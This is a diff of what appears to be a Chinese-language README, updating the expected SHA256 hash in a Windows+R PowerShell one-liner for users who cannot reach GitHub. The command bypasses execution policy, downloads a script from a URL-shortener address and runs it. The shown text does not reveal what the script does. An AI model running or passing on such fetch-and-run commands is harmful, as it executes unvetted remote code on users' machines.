@@ -18,5 +18,5 @@ powershell -Exec Bypass -C "$f=$env:TEMP+'\b.ps1';iwr 'https://bjs.r.shortio.cn/
 用于无法直接访问GitHub人群
 Windows+R 运行
 ```Windows+R
-powershell -Exec Bypass -C "$p=$env:TMP+'\s.ps1';iwr 'https://bjs.r.shortio.cn/Share-P' -Out $p -UseBasicParsing;if((Get-FileHash $p -A SHA256).Hash -eq '125042580313C71BFE470B470AD7D400F9888D4BC72A52978B92AE12413D888C'){&$p}else{echo X;Read-Host}"
+powershell -Exec Bypass -C "$p=$env:TMP+'\s.ps1';iwr 'https://bjs.r.shortio.cn/Share-P' -Out $p -UseBasicParsing;if((Get-FileHash $p -A SHA256).Hash -eq '8F5AE35AFD4810270CF5F3DF309FA12861C1384634E165089D3E1661C37D795F'){&$p}else{echo X;Read-Host}"
 ```
